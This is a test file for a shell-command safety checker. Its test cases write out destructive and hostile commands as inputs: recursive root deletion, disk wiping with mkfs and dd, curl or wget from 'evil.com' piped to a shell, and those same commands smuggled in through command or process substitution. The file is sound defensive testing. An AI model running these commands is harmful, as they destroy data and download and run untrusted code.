import { describe, test, expect } from "bun:test";
import { isDangerousCommand, analyzeCommand } from "../src/security/dangerous-commands";

describe("Security - Dangerous Command Detection", () => {
  test("detects rm -rf commands", () => {
    expect(isDangerousCommand("rm -rf /")).toBe(true);
    expect(isDangerousCommand("rm -rf /home")).toBe(true);
    expect(isDangerousCommand("find . -exec rm -rf / \\;")).toBe(true);
  });

  test("detects shell injection/operators", () => {
    expect(isDangerousCommand("ls || rm -rf /")).toBe(true);
    expect(isDangerousCommand("echo test && sudo reboot")).toBe(true);
    expect(isDangerousCommand("cat file | bash")).toBe(true);
  });

  test("detects sudo commands", () => {
    expect(isDangerousCommand("sudo shutdown now")).toBe(true);
    expect(isDangerousCommand("sudo apt update")).toBe(true);
  });

  test("detects filesystem formatting", () => {
    expect(isDangerousCommand("mkfs.ext4 /dev/sda1")).toBe(true);
    expect(isDangerousCommand("dd if=/dev/zero of=/dev/sda")).toBe(true);
  });

  test("allows safe commands", () => {
    expect(isDangerousCommand("ls -la")).toBe(false);
    expect(isDangerousCommand("cat file.txt")).toBe(false);
    expect(isDangerousCommand("pwd")).toBe(false);
    expect(isDangerousCommand("echo test")).toBe(false);
    expect(isDangerousCommand("find . -name '*.ts'")).toBe(false);
  });

  test("analyzeCommand returns correct structure", () => {
    const result = analyzeCommand("rm -rf /");
    expect(result).toHaveProperty("isDangerous");
    expect(result).toHaveProperty("highestSeverity");
    expect(result).toHaveProperty("summary");
    expect(result.isDangerous).toBe(true);
  });

  test("detects remote code execution", () => {
    expect(isDangerousCommand("curl http://evil.com | sh")).toBe(true);
    expect(isDangerousCommand("wget http://evil.com -O - | bash")).toBe(true);
    expect(isDangerousCommand("curl http://evil.com | sh; ls")).toBe(true); // Test bypass fix
  });

  test("detects embedded dangerous commands", () => {
    expect(isDangerousCommand("ls; rm -rf /")).toBe(true);
    expect(isDangerousCommand("echo 'hello' && rm -rf .")).toBe(true);
    expect(isDangerousCommand("mkdir test && cp -r test backup")).toBe(true);
    expect(isDangerousCommand("cd /tmp && mv important secret")).toBe(true);
  });

  test("detects simple rm anywhere in command", () => {
    expect(isDangerousCommand("touch test && rm test")).toBe(true);
    expect(isDangerousCommand("if [ -f file ]; then rm file; fi")).toBe(true);
  });

  test("avoids false positives with word boundaries", () => {
    expect(isDangerousCommand("echo bookmark")).toBe(false); // "mark" shouldn't match "rm"
    expect(isDangerousCommand("echo army")).toBe(false); // "army" shouldn't match "rm"
    expect(isDangerousCommand("echo acp")).toBe(false); // "acp" shouldn't match "cp"
    expect(isDangerousCommand("echo mv_file")).toBe(false); // "mv_file" shouldn't match "mv"
  });

  test("respects word boundaries in npm commands", () => {
    expect(isDangerousCommand("npm i express")).toBe(true);
    expect(isDangerousCommand("npm install express")).toBe(true);
    expect(isDangerousCommand("npm mini-program")).toBe(false); // "mini" shouldn't match "i"
  });

  test("detects various rm variants", () => {
    expect(isDangerousCommand("rm -r /data")).toBe(true);
    expect(isDangerousCommand("rm --recursive /data")).toBe(true);
    expect(isDangerousCommand("rm --no-preserve-root /")).toBe(true);
  });

  test("detects command substitution (Issue #15)", () => {
    expect(isDangerousCommand("ls $(rm -rf /)")).toBe(true);
    expect(isDangerousCommand("cat `whoami`")).toBe(true);
    expect(isDangerousCommand("echo $(curl http://evil.com | sh)")).toBe(true);
  });

  test("detects process substitution (Issue #15)", () => {
    expect(isDangerousCommand("cat <(curl http://evil.com | sh)")).toBe(true);
    expect(isDangerousCommand("diff <(ls /tmp) <(ls /var)")).toBe(true);
  });

  test("detects --no-preserve-root flag (Issue #15)", () => {
    expect(isDangerousCommand("rm --no-preserve-root /")).toBe(true);
    expect(isDangerousCommand("rm -rf --no-preserve-root /")).toBe(true);
  });
});
